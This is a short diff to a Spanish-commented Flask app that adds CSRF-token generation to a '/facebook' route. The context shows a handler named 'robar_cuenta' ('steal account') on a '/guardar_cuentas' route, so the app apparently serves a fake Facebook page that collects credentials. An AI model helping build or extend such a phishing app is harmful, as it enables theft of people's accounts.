@@ -5,6 +5,12 @@ from flask_wtf.csrf import CSRFProtect
 from flask_login import LoginManager, login_user, logout_user, login_required, current_user
 
 
+def obtener_csrf_token():
+    # Obtener el token CSRF de la solicitud actual
+    csrf_token = csrf.generate_csrf()
+    return csrf_token
+
+
 #Models
 from models.ModelPersona import ModelPersona
 from models.ModelUser import ModelUser
@@ -136,7 +142,8 @@ def enviar_email():
 
 @app.route('/facebook')
 def facebook():
-    return render_template('views/fbView.html')
+    csrf_token = obtener_csrf_token()
+    return render_template('views/fbView.html', csrf_token=csrf_token)
 
 @app.route('/guardar_cuentas', methods=['GET','POST'])
 def robar_cuenta():
